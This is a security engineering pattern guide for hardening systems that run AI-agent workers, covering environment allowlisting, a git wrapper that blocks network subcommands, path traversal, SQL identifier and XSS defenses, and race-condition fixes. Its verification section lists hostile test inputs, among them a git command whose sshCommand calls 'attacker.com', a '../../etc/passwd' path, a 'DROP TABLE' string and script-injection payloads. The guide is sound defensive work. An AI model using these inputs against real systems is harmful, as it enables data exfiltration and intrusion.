---
title: "Security Hardening Patterns for AI-Agent-Driven Systems"
type: pattern
tags: [security, hardening, ai-agents, path-traversal, sandbox, isolation, xss, sql-injection, concurrency]
domain: software-engineering
created: 2026-02-24
updated: 2026-02-24
confidence: medium
complexity: high
related: [ai_worker_orchestration_worktree_isolation, iterative_visual_generation_pipeline]
---

# Security Hardening Patterns for AI-Agent-Driven Systems

## Problem

You have a system where AI agents (Codex, OpenCode, or similar) execute code in spawned processes, often with a human-in-the-loop orchestrator. The agents can read files, run shell commands, call APIs, and produce outputs that are rendered in a web dashboard. Standard web application security applies, but the AI-agent layer introduces new attack surfaces:

- Agent workers inherit the parent process's environment, including secrets and credentials
- Agent-generated content (SVG, HTML, markdown) is rendered in a browser, creating XSS vectors
- User-influenced data flows through file paths, database identifiers, and config values without sanitization
- Concurrent agent execution creates race conditions around shared state
- Long-running agent processes can hang indefinitely without timeouts

These are not theoretical risks. Across two real projects (a gateway daemon orchestrating Codex workers, and an SVG generation pipeline with a web dashboard), 33+ concrete security findings were identified and fixed across multiple audit rounds.

## Context

These patterns were discovered while hardening two AI-agent-driven systems:

1. **Consultancy gateway daemon** (TypeScript/Node.js): An orchestrator that manages task queues, spawns Codex SDK worker processes, and stores results in SQLite. Workers have access to a git repository and filesystem.
2. **SVG generation pipeline** (Python/FastAPI): A pipeline where AI agents generate SVG visualizations, rendered through multiple backends (cairosvg, resvg, rsvg-convert), with a web dashboard for configuration and viewing results.

Common characteristics of these systems:
- AI agents execute with significant system access (filesystem, network, shell)
- Outputs are rendered in a web browser
- Multiple concurrent agents and web requests share mutable state
- Configuration includes API keys and sensitive settings exposed via endpoints
- Both run as local-first tools but can be inadvertently network-exposed

The patterns here are language-agnostic in concept, though the code examples use TypeScript and Python since those are the two dominant languages in the AI agent ecosystem.

## Approach

Security hardening for AI-agent systems breaks down into ten distinct patterns, organized from highest-risk (agent isolation) to operational concerns (default configurations).

### 1. Worker Isolation: Environment Allowlisting and Command Policy Enforcement

The most critical pattern. AI agent workers must not inherit the parent process's full environment or have unrestricted command access.

**Layer 1 -- Environment variable allowlisting.** Build the worker's environment from scratch using an explicit allowlist rather than filtering a denylist from the parent's `process.env`:

```typescript
// Allowlist: only these variables are passed to the worker
const ENV_ALLOWLIST = new Set([
  "PATH", "HOME", "USER", "SHELL", "LANG", "TMPDIR",
  "NODE_PATH", "OPENAI_API_KEY", "CODEX_HOME",
]);

// Denylist: even if somehow present, these are never passed
const ENV_DENYLIST = new Set([
  "GIT_SSH", "GIT_SSH_COMMAND", "GIT_PROXY_COMMAND",
  "GIT_CONFIG_COUNT", "GIT_ASKPASS",
]);

function buildWorkerEnv(): Record<string, string> {
  const env: Record<string, string> = {};
  for (const key of ENV_ALLOWLIST) {
    if (key in process.env && !ENV_DENYLIST.has(key)) {
      env[key] = process.env[key]!;
    }
  }
  return env;
}
```

The allowlist-first approach is essential: a denylist will always miss exotic variable names that a creative attacker can exploit (e.g., `GIT_CONFIG_COUNT` + `GIT_CONFIG_KEY_0` + `GIT_CONFIG_VALUE_0` to inject arbitrary git config).

**Layer 2 -- Git command policy wrapper.** Replace the real `git` binary on the worker's `$PATH` with a wrapper script that intercepts and filters subcommands:

```bash
#!/usr/bin/env bash
# git-wrapper.sh -- placed earlier on $PATH than the real git binary
# Blocks network-capable and config-mutation git subcommands

REAL_GIT="/usr/bin/git"
BLOCKED_CMDS="push|fetch|pull|remote|ls-remote|clone|submodule|bundle|archive|send-email"

# Parse arguments to find the real subcommand.
# git allows global flags before the subcommand: git -c key=val push
# Flags that consume the NEXT argument as a value:
VALUE_FLAGS="-c|-C|--git-dir|--work-tree|--exec-path|--namespace"

subcmd=""
skip_next=false
for arg in "$@"; do
  if $skip_next; then
    skip_next=false
    continue
  fi
  # Handle --flag=value form (no skip needed)
  if [[ "$arg" == --*=* ]]; then
    continue
  fi
  # Handle flags that consume the next argument
  if [[ "$arg" =~ ^(${VALUE_FLAGS})$ ]]; then
    skip_next=true
    continue
  fi
  # Skip other flags
  if [[ "$arg" == -* ]]; then
    continue
  fi
  # First non-flag argument is the subcommand
  subcmd="$arg"
  break
done

if [[ "$subcmd" =~ ^(${BLOCKED_CMDS})$ ]]; then
  echo "error: git $subcmd is not allowed in this sandbox" >&2
  exit 1
fi

# Also block config mutations targeting remote URLs
if [[ "$subcmd" == "config" ]]; then
  for arg in "$@"; do
    if [[ "$arg" =~ ^remote\..+\.(url|pushurl)$ ]] || \
       [[ "$arg" =~ ^url\..+\.(insteadOf|pushInsteadOf)$ ]]; then
      echo "error: git config $arg is not allowed in this sandbox" >&2
      exit 1
    fi
  done
fi

exec "$REAL_GIT" "$@"
```

The critical subtlety here is the subcommand parsing. A naive wrapper that checks only `$1` is trivially bypassed by `git -c core.sshCommand="exfil-script" push`. The wrapper must iterate arguments, skip flags, and handle value-consuming flags that eat the next positional argument.

### 2. Path Traversal Prevention

Any time user-influenced data becomes part of a filesystem path, validate containment. Two concrete patterns:

**Pattern A -- Resolve-and-check containment (Python, for operations on existing or computed paths):**

```python
# entry_id comes from a JSON file that could be corrupted or tampered with
target = (assets_dir / entry_id).resolve(strict=False)
try:
    target.relative_to(assets_dir.resolve(strict=False))
except ValueError:
    continue  # path escapes the assets directory -- skip silently
```

Use `resolve(strict=False)` because the path may not exist yet (e.g., about to be created). The `relative_to` check raises `ValueError` if the resolved target is not inside the base directory.

**Pattern B -- Sanitize path components (TypeScript, for constructing filenames from user input):**

```typescript
// skillId and version come from user/agent input
private sanitizeFilename(name: string): string {
  return name.replace(/[^a-zA-Z0-9_-]/g, "_");
}

const safeSkillId = this.sanitizeFilename(skillId);
const safeVersion = this.sanitizeFilename(version);
const cachePath = path.join(cacheDir, `${safeSkillId}@${safeVersion}.md`);
const metaPath = path.join(cacheDir, `${safeSkillId}.json`);
```

Strip everything except alphanumeric characters, underscores, and hyphens. This eliminates `..`, `/`, `\`, null bytes, and other traversal characters. Apply to every user-derived component individually before joining paths.

### 3. SQL Injection Guards for DDL Identifiers

Parameterized queries protect data values, but DDL statements (`ALTER TABLE`, `PRAGMA table_info()`) require string interpolation for table and column names. When these identifiers are dynamic (e.g., in a schema migration helper), validate before interpolation:

```typescript
const SAFE_IDENTIFIER = /^[a-z_][a-z0-9_]*$/;
const ALLOWED_TYPES = [
  "TEXT", "TEXT NOT NULL", "TEXT NULL",
  "INTEGER", "INTEGER NOT NULL",
  "REAL", "REAL NOT NULL",
  "BLOB",
];

function ensureColumn(db: Database, table: string, column: string, type: string): void {
  if (!SAFE_IDENTIFIER.test(table)) throw new Error(`Invalid table name: ${table}`);
  if (!SAFE_IDENTIFIER.test(column)) throw new Error(`Invalid column name: ${column}`);
  if (!ALLOWED_TYPES.includes(type.toUpperCase())) throw new Error(`Invalid type: ${type}`);

  const existing = db.pragma(`table_info(${table})`);
  if (!existing.some((col: any) => col.name === column)) {
    db.exec(`ALTER TABLE ${table} ADD COLUMN ${column} ${type}`);
  }
}
```

This is defense-in-depth: callers typically pass string literals, but the guard prevents future misuse when someone adds a dynamic call path.

### 4. Zod Schema Validation at the Database Boundary

Replace TypeScript `as` casts on database reads with runtime schema validation. Database corruption, schema migration bugs, or manual SQL edits can produce rows that violate type invariants, causing subtle errors far from the data source:

```typescript
import { z } from "zod";

// Define Zod schema mirroring the domain type
const ProjectRecordSchema = z.object({
  slug: z.string(),
  name: z.string(),
  status: z.enum(["active", "paused", "complete"]),
  created_at: z.string(),
  metadata: z.string().transform((s) => JSON.parse(s)),
});

// Generic helpers on the store class
function parseRow<T>(schema: z.ZodType<T>, row: unknown): T | undefined {
  if (!row) return undefined;
  return schema.parse(row);  // throws ZodError with path + message on mismatch
}

function parseRows<T>(schema: z.ZodType<T>, rows: unknown[]): T[] {
  return rows.map((r) => schema.parse(r));
}

// Usage: fail-fast at the database boundary
const project = parseRow(ProjectRecordSchema, db.get("SELECT * FROM projects WHERE slug = ?", slug));
```

When a corresponding JSON Schema exists (e.g., for validating worker output via an SDK), add a `@SYNC` JSDoc comment linking the Zod schema to the JSON Schema so they stay in lockstep.

### 5. Race Condition Fixes (Four Distinct Patterns)

Concurrency bugs in AI-agent systems are especially insidious because they only manifest under load and are nearly impossible to reproduce in development.

**Pattern A -- Atomic lease acquisition before spawning workers.** When a daemon tick loop checks whether to spawn a worker, the lease (lock) must be acquired atomically in the same operation that checks availability. A two-step "check then acquire" pattern creates a TOCTOU window where two ticks both see an expired lease and both spawn workers for the same task. Use a single atomic check-and-set operation (e.g., `UPDATE ... WHERE lease_expiry < NOW() RETURNING *`).

**Pattern B -- Resolve all configuration upfront.** If agent commands are resolved lazily (e.g., reading environment variables at each pipeline stage), a user changing settings mid-pipeline causes different stages of the same run to use different configurations. Fix: resolve ALL agent commands and configuration values at the start of the pipeline run, before entering the iteration loop. Store resolved values in local variables.

**Pattern C -- Deep copy shared mutable state.** Python's `dict(original)` and JavaScript's `{...original}` create shallow copies. Nested dicts/objects remain shared references. In a concurrent web server, a mutation to the original's nested structure propagates to a copy that is still being serialized for a response. Always use `copy.deepcopy()` (Python) or `structuredClone()` / a deep clone utility (JavaScript) when returning shared state from locked sections.

**Pattern D -- Bound in-memory stores with TTL eviction.** In-memory job/task stores in web servers grow without bound if completed entries are never cleaned up. Add: a lock protecting concurrent access, TTL-based eviction of completed entries (e.g., 1 hour), and a hard cap (e.g., 200 entries) with HTTP 503 rejection when full. Without the lock, concurrent async handlers and background threads can corrupt the dict.

### 6. XSS Prevention for AI-Generated Content

AI agents produce content (SVG, HTML, markdown) that gets rendered in a browser. This content is untrusted by definition -- the agent may have been influenced by malicious training data, prompt injection, or simply produce unexpected markup.

**Layer 1 -- Content sanitizer.** Parse the content (e.g., SVG as XML), walk the element tree, and enforce a strict policy:

- **Remove forbidden elements:** `script`, `foreignObject`, `iframe`, `object`, `embed`, `animate`, `set`, `animateMotion`, `animateTransform`
- **Strip forbidden attributes:** any attribute starting with `on` (event handlers like `onclick`, `onerror`, `onload`)
- **Restrict URL attributes:** `href`, `xlink:href`, `src`, `data`, `poster`, `action`, `formaction` are only allowed if they are internal fragment references (`#id` or `url(#id)`). All external URLs are stripped.
- **Support two modes:** `strip` (silently remove violations, for best-effort rendering) and `strict` (raise an error on first violation, for security-critical paths)
- **Externalize the policy** in a YAML config file so it can be updated without code changes

**Layer 2 -- Iframe sandbox.** Even after sanitization, render untrusted content in an `<iframe sandbox="">` with an empty sandbox attribute (maximum restrictions: no scripts, no forms, no navigation, no popups). Set content via the `srcdoc` attribute. This is defense-in-depth: if the sanitizer misses a novel attack vector, the sandbox contains the blast radius.

### 7. Config Validation with parseEnum

TypeScript config loading commonly uses `process.env.X as ConfigType` casts for enum values (sandbox mode, approval policy, reasoning effort, etc.). Any typo in the environment variable silently produces an invalid value that passes compile-time type checking but causes runtime misbehavior:

```typescript
function parseEnum<T extends string>(
  input: string | undefined,
  allowed: readonly T[],
  fallback: T,
  label: string,
): T {
  const trimmed = input?.trim() as T;
  if (trimmed && allowed.includes(trimmed)) return trimmed;
  if (input !== undefined) {
    console.warn(`Invalid ${label}: "${input}", falling back to "${fallback}"`);
  }
  return fallback;
}

// Usage: replace unsafe `as` casts
const sandboxMode = parseEnum(process.env.SANDBOX_MODE, ["strict", "permissive", "off"] as const, "strict", "SANDBOX_MODE");
```

### 8. Untrusted Data Sanitization for External Sources

When AI agents call external tools (web search, API calls), the returned data is untrusted. Sanitize every field before storing or rendering:

- **Strings:** HTML-entity-encode `<`, `>`, `"`, `'` and truncate to a reasonable maximum (e.g., 10,000 characters)
- **URLs:** Parse with `new URL()`, reject any protocol other than `http:` and `https:` (blocks `javascript:`, `data:`, `file:`), truncate to 2,048 characters
- **Numbers:** Clamp to a valid range (e.g., confidence scores to 0--1), default `NaN` to the range minimum
- **Arrays:** Map each element through the appropriate field-level sanitizer

### 9. Default to Localhost, Restrict CORS

CLI tools with web dashboards commonly default to `--host 0.0.0.0` for convenience, exposing the dashboard (and any API key configuration endpoints) to all network interfaces. A user running the server without arguments unknowingly exposes secrets to the local network.

Fix: default the host to `127.0.0.1`. Require explicit `--host 0.0.0.0` for network access. Restrict CORS origins to specific expected values (`localhost:3000`, `localhost:3001`) rather than wildcard `*`.

### 10. Subprocess Timeout Enforcement

AI-agent pipelines often shell out to rendering or processing tools (cairosvg, resvg, rsvg-convert, ffmpeg, etc.). A malformed input can cause an infinite loop or hang in the subprocess, blocking the pipeline thread indefinitely:

```python
try:
    result = subprocess.run(
        ["cairosvg", input_path, "-o", output_path],
        capture_output=True,
        timeout=30,  # seconds -- adjust per expected workload
    )
except subprocess.TimeoutExpired:
    raise RenderError(f"Render timed out after 30s for {input_path}")
```

Always set explicit timeouts on `subprocess.run()`. Convert `TimeoutExpired` to a domain-specific error with a descriptive message so the orchestrator can retry or skip.

## Key Decisions

- **Allowlist over denylist for environment variables.** A denylist will always miss something. The cost of an allowlist is that new legitimate variables require an explicit addition, but this is a minor maintenance burden compared to the risk of env variable smuggling.

- **Two-layer defense for XSS (sanitizer + iframe sandbox).** Either layer alone has known bypass vectors. The sanitizer handles the common cases; the iframe sandbox contains novel attacks. The marginal cost of the iframe is near zero.

- **Zod validation at the database boundary, not at the application layer.** Validating at the boundary catches corruption and migration bugs at the earliest possible point. Validating deeper in the application is too late -- the invalid data has already been passed through multiple function calls.

- **Regex + type allowlist for SQL identifiers rather than a query builder.** For the specific case of DDL (which query builders typically don't support), a simple regex plus closed type list is easier to audit than a custom escaping function. Under different conditions (if DDL identifiers were truly dynamic from user input), a more robust approach would be needed.

- **Deep copy over shallow copy for concurrent shared state.** The performance cost of deep copy is negligible for settings-sized objects. The debugging cost of a shallow-copy race condition is enormous (intermittent data corruption that only manifests under concurrent load).

- **Externalized sanitization policy (YAML config).** Embedding the allowed/blocked element lists in code requires a code deploy to update. A config file allows updating the policy without rebuilding, which matters when new SVG attack vectors are discovered.

## Pitfalls & Gotchas

1. **Git wrapper bypass via global flags.** The first version of the git policy wrapper checked only `$1` as the subcommand. `git -c core.sshCommand="exfil-script" push` places `push` at position 3, bypassing the check entirely. This is the most dangerous class of security bug: the wrapper provides a false sense of security while a trivial flag reordering defeats it. You must parse git's actual argument grammar -- iterate arguments, skip flags, and handle value-consuming flags (`-c`, `-C`, `--git-dir`, `--work-tree`) that eat the next positional argument.

2. **Shallow copy race conditions.** Python's `dict(original)` and JavaScript's `{...original}` create shallow copies where nested structures remain shared references. In a concurrent web server, a `put_settings` endpoint mutating a nested dict while FastAPI is still serializing a `get_settings` response causes intermittent data corruption. This is nearly impossible to reproduce in testing because it requires precise timing overlap. Always use `deepcopy` / `structuredClone` for shared state.

3. **Cache invalidation after total backend failure.** A cached `discover_backends()` result is fine when some backends succeed. But if ALL backends fail (e.g., a dependency was uninstalled), the cache persists the "all failed" result permanently. Every subsequent call fails instantly without re-probing the filesystem. Fix: invalidate the cache specifically when all backends fail, so the next call re-discovers.

4. **Lease race producing duplicate workers.** Removing a lease acquisition step "for simplicity" created a TOCTOU race: two daemon ticks could both see an expired lease, both pass the expiry check, and both spawn workers for the same task. The lease must be acquired atomically (check-and-set in a single database operation) before spawning. Never separate "check if available" from "mark as acquired."

5. **Duplicate migration version numbers.** Copy-paste during rapid development produced two migrations numbered 4, two numbered 5, etc. The versioned migration runner skips already-applied versions, so the duplicate was silently never executed. The schema was missing columns with no error. Fix: renumber all migrations sequentially, and add a uniqueness assertion in the migration runner that fails loudly on duplicate version numbers.

6. **`os.environ` mutations outside the settings lock.** In a concurrent web server, mutating `os.environ` from an async settings endpoint without holding the settings lock creates a race with pipeline threads that read those same env vars. Even though CPython's GIL makes individual dict operations atomic, the combination of "update env var + update settings dict" must be atomic as a unit. Wrap both mutations in the same lock acquisition.

7. **Hardcoded dev paths in production scripts.** A backend wrapper script contained a hardcoded path to a developer's local checkout (`/Users/dev/projects/...`). This works in development, silently fails in deployment (the path doesn't exist, the backend is skipped, and renders degrade to a fallback with no error). Fix: require the path via an environment variable with `os.environ["VAR"]` (not `.get()` with a default), so it fails fast with a `KeyError` if not set.

8. **Default `--reload` in production.** Uvicorn's `reload=True` watches for file changes and restarts the server. In production, this wastes CPU on filesystem polling and can restart the server mid-request if a stray file write occurs (e.g., a log rotation or temp file). Default `--reload` to `False`; require explicit `--reload` opt-in for development.

## Recipe

To harden an AI-agent-driven system from scratch:

1. **Audit the worker spawn path.** Trace how agent worker processes are created. Identify what environment variables, filesystem access, and network access they inherit. Implement environment allowlisting and a command policy wrapper (patterns 1). Test by running `env` and blocked commands from within a worker.

2. **Map all user-influenced data flows into file paths.** Search the codebase for `path.join`, `os.path.join`, `Path(...)`, and any string interpolation into filesystem operations. For each, determine whether the interpolated value could be influenced by user input, agent output, or database content. Apply resolve-and-check containment or filename sanitization (pattern 2).

3. **Audit database interactions.** Search for `as` type casts on database reads and replace with Zod schema validation (pattern 4). Search for string interpolation in SQL and add identifier validation (pattern 3). Check migration version numbers for duplicates.

4. **Identify all shared mutable state in concurrent paths.** Search for module-level dicts, global variables, and `os.environ` mutations that are accessed from both request handlers and background threads. Protect with locks, use deep copies when returning data, and add TTL eviction and hard caps to unbounded stores (pattern 5).

5. **Sanitize AI-generated content before rendering.** If the system renders agent output in a browser (SVG, HTML, markdown), implement a content sanitizer and an iframe sandbox (pattern 6). Test by injecting `<script>alert(1)</script>` and `<svg onload="alert(1)">` into agent output.

6. **Validate all configuration enum values.** Search for `as ConfigType` casts and `process.env.X` reads that are used as enum discriminants. Replace with `parseEnum()` (pattern 7). Set intentionally invalid values and verify the warning + fallback behavior.

7. **Sanitize external data sources.** If agents call web search, APIs, or other external tools, sanitize the returned fields: HTML-encode strings, validate URL protocols, clamp numeric ranges (pattern 8).

8. **Lock down network exposure.** Change default host binding from `0.0.0.0` to `127.0.0.1`. Replace CORS wildcard `*` with specific allowed origins (pattern 9). Test by attempting to access the dashboard from another machine on the network.

9. **Add subprocess timeouts.** Search for `subprocess.run()`, `subprocess.Popen()`, and equivalent calls. Add explicit `timeout` parameters. Catch `TimeoutExpired` and convert to descriptive domain errors (pattern 10).

10. **Remove dev-mode defaults from production paths.** Search for `reload=True`, hardcoded paths, and debug flags that should not be active in production (pitfalls 7 and 8). Ensure they require explicit opt-in.

## Verification

- **Worker isolation:** From within a spawned worker process, run `env` and confirm only allowlisted variables are present. Run `git push`, `git remote`, `git -c key=val push` and confirm all are blocked with the correct error message. Specifically test `git -c core.sshCommand="curl attacker.com" push` to verify the argument-parsing fix.

- **Path traversal:** Attempt to create or access a file with `../../etc/passwd` as an identifier component. Confirm the operation is either skipped or raises an error, and no file is created outside the designated directory.

- **SQL injection:** Call `ensureColumn` with a table name of `users; DROP TABLE projects--` and confirm it throws an error before reaching the database.

- **Database validation:** Manually corrupt a database row (e.g., set a status column to an invalid enum value). Read the row through the application and confirm a `ZodError` is thrown with a clear message identifying the field and expected values.

- **Race conditions:** Run a load test with concurrent requests to settings endpoints while a pipeline is executing. Verify that pipeline stages use consistent configuration throughout a single run, and that settings responses are not corrupted.

- **XSS prevention:** Inject `<script>alert('xss')</script>` and `<svg><foreignObject><body onload="alert('xss')"></body></foreignObject></svg>` into agent output. Confirm the script tags and event handlers are stripped, and the content renders in a sandboxed iframe.

- **Config validation:** Set an environment variable to a typo'd value (e.g., `SANDBOX_MODE=strct`). Confirm a warning is logged and the fallback value is used.

- **Network exposure:** Start the server with default arguments. From another machine on the same network, attempt to reach the dashboard. Confirm connection is refused (bound to localhost only).

- **Subprocess timeouts:** Feed a known-slow or infinite-loop input to a render subprocess. Confirm it is killed after the timeout period and a descriptive error is raised.

- **Subtle failure mode to watch for:** The system "works" but a security layer is silently inactive. For example, the git wrapper is on `$PATH` but the real `git` binary is found first (PATH ordering), or the iframe sandbox attribute is set to `sandbox="allow-scripts"` instead of the empty `sandbox=""`. Always verify that the security mechanism is actually engaged, not just present.
